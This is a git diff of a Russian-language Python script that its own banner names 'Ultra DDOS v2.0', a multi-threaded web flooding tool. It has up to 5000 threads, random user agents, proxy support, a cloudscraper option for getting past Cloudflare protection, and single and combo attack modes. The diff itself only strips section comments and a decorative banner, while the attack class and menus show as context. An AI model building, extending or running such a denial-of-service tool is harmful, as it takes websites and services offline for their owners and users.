@@ -9,7 +9,6 @@ from concurrent.futures import ThreadPoolExecutor
 from urllib.parse import urlparse
 import psutil
 
-# ================= ВКЛЮЧАЕМ ANSI ДЛЯ WINDOWS =================
 if os.name == 'nt':
     try:
         import ctypes
@@ -18,11 +17,9 @@ if os.name == 'nt':
     except:
         pass
 
-# ================= НАСТРОЙКИ =================
 MAX_THREADS = 5000
 TIMEOUT = 3
 
-# ================= ЦВЕТА =================
 G1 = "\033[38;2;0;60;0m"
 G2 = "\033[38;2;0;90;0m"
 G3 = "\033[38;2;0;120;0m"
@@ -37,7 +34,6 @@ C = "\033[96m"
 W = "\033[97m"
 E = "\033[0m"
 
-# ================= USER-AGENTS =================
 USER_AGENTS = [
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0',
     'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0',
@@ -45,14 +41,12 @@ USER_AGENTS = [
     'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15',
 ]
 
-# ================= CLOUDFLARE =================
 try:
     import cloudscraper
     CLOUDSCRAPER_AVAILABLE = True
 except:
     CLOUDSCRAPER_AVAILABLE = False
 
-# ================= ФУНКЦИИ =================
 def random_headers():
     return {
         'User-Agent': random.choice(USER_AGENTS),
@@ -146,7 +140,6 @@ def check_cpu():
     except:
         return 0
 
-# ================= БАННЕР (ЧИСТЫЙ, БЕЗ TARISTE) =================
 def banner():
     clear()
     print(f"""
@@ -160,11 +153,6 @@ def banner():
 {G3}   ░░░ ░ ░   ░ ░   ░        ░░   ░   ░   ▒       ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  {E}
 {G2}     ░         ░  ░          ░           ░  ░      ░       ░        ░ ░        ░  {E}
 {G1}                                               ░       ░                           {E}
-{G7}████████  █████  ██████  ██ ███████ ████████ ███████{E}
-{G7}   ██    ██   ██ ██   ██ ██ ██         ██    ██{E}
-{G7}   ██    ███████ ██████  ██ ███████    ██    █████{E}
-{G7}   ██    ██   ██ ██   ██ ██      ██    ██    ██{E}
-{G7}   ██    ██   ██ ██   ██ ██ ███████    ██    ███████{E}
 {G5}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 {G7}Ultra DDOS v2.0 | Developer: verifactor @newince
 {G5}Максимум потоков: {W}{MAX_THREADS}
@@ -174,7 +162,6 @@ def banner():
 {E}
 """)
 
-# ================= КЛАСС АТАКИ =================
 class Attack:
     def __init__(self, name="", proxies=None, use_cloudscraper=False, mode="normal", auto_tune=False, duration=0):
         self.name = name
@@ -286,7 +273,6 @@ class Attack:
     def stop(self):
         self.running = False
 
-# ================= ВЫВОД СТАТУСА =================
 def show_attack_status(attacks):
     sys.stdout.write('\033[H')
     sys.stdout.flush()
@@ -344,7 +330,6 @@ def show_attack_status(attacks):
     sys.stdout.write('\033[J' + output)
     sys.stdout.flush()
 
-# ================= ОДИНОЧНАЯ АТАКА =================
 def single_attack():
     clear()
     banner()
@@ -421,7 +406,6 @@ def single_attack():
 """)
     input(f"{G7}Нажми ENTER для возврата...{E}")
 
-# ================= КОМБО-АТАКА =================
 def combo_attack():
     clear()
     banner()
@@ -513,7 +497,6 @@ def combo_attack():
     print(f"\n{G7}Нажми ENTER для возврата...{E}")
     input()
 
-# ================= МЕНЮ =================
 def menu():
     clear()
     banner()
@@ -527,7 +510,6 @@ def menu():
 {E}
 """)
 
-# ================= MAIN =================
 def main():
     while True:
         menu()
